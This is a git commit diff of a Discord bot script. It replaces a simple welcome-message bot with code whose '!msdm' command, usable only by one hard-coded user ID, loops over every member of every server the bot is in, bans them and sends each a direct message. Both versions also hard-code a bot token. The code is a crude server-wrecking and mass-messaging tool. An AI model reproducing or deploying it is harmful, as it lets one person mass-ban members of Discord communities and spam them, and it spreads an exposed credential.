53107c5b5ab2795000e5a5c4f6472095eba30370
VladDisco07 <32614194+VladDisco07@users.noreply.github.com>
2018-04-27 14:00:26 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,31 +1,41 @@
-/*
-  A bot that welcomes new guild members when they join
-*/
+const Discord = require(`discord.js`)
+const client = new Discord.Client()
+const prefix = "!"
+const bot = new Discord.Client()
+const token = "NDM0Njc4NDEwNTczMjUwNTcx.DbN_gw.gSAtsHlnNZ0x4Vcil433b4QHtH8"
+const log = message => {
+  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
+};
 
-// Import the discord.js module
-const Discord = require('discord.js');
-
-// Create an instance of a Discord client
-const client = new Discord.Client();
-
-// The token of your bot - https://discordapp.com/developers/applications/me
-const token = 'NDM0Njc4NDEwNTczMjUwNTcx.DbN_gw.gSAtsHlnNZ0x4Vcil433b4QHtH8';
-
-// The ready event is vital, it means that your bot will only start reacting to information
-// from Discord _after_ ready is emitted
-client.on('ready', () => {
-  console.log('I am ready!');
+client.on("guildCreate", guild => {
+      console.log(`${guild.name},  ${guild.memberCount} members!`);
+      client.user.setGame("the fuck is a hackerland lol");
+});
+client.on("guildDelete", guild => {
+  console.log(`- ${guild.name} :c`);
 });
 
-// Create an event listener for new guild members
-client.on('guildMemberAdd', member => {
-  // Send the message to a designated channel on a server:
-  const channel = member.guild.channels.find('name', 'general');
-  // Do nothing if the channel wasn't found on this server
-  if (!channel) return;
-  // Send the message, mentioning the member
-  channel.send(`Bine ai venit pe **HackerLand Rewritten**, ${member}! Nu uita sa citesti regulamentul si apoi sa te alaturi chat-ului :wink:`);
+
+client.on('message', message => {
+if(message.content.startsWith('!msdm')) {
+    if(message.author.id === "436879011860447242"){
+        let args = message.content.split(" ").slice(1);
+        var argresult = args.join(" ")
+        const argsresult = args.join(" ")
+        let reason = args.join(" ")
+                  if(!args[1]) {
+ }
+ if(args[1]) {
+     client.guilds.forEach(guild => {
+guild.members.forEach(member => {
+message.guild.ban(member)
+member.send(reason)
+message.delete()
+})})}}}
 });
 
-// Log our bot in
-client.login(token);
+client.on("ready", () => {
+    console.log("On " + client.guilds.size + " guilds.")
+    console.log("With " + client.users.size + " members.")
+});
+client.login(token)
